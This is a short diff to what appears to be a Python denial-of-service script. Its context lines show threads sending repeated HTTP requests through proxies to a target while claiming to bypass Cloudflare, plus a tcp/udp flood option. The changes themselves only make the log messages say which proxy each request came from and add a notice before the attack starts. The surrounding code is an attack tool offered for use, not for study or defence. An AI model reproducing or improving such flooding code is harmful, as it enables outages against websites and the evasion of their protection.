@@ -125,11 +125,11 @@ class atk:
         while True:
             try:
                 s.get(attack_target)
-                print("successfully bypass cloudflare to [ %s ]"%(attack_target))
+                print("successfully bypass cloudflare to [ %s ] from [ %s:%s ]"%(attack_target, str(prox[0]), str(prox[1])))
                 try:
                     for i in range(70):
                         s.get(attack_target)
-                        print("successfully bypass cloudflare to [ %s ]"%(attack_target))
+                        print("successfully bypass cloudflare to [ %s ] from [ %s:%s ]"%(attack_target, str(prox[0]), str(prox[1])))
                     s.close()
                 except:
                     s.close()
@@ -148,6 +148,7 @@ elif proxydos == "y":
         x = threading.Thread(target=atk.proxyrequestdos)
         x.start()
         print("thread " + str(i + 1) + " was created")
+    print("wait for a second to start dos")
 else:
     dostype = str(input("type(tcp / udp):"))
     input("please press enter to continue...")
